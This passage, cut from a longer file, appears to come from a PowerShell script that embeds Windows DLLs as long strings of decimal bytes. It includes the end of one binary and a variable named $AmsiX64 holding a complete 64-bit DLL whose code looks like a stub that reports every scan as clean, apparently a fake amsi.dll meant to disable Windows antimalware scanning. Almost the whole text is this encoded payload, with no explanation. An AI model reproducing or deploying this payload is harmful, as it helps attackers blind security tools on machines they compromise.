116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\u0026#34; $AmsiX64 = \u0026#34;77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 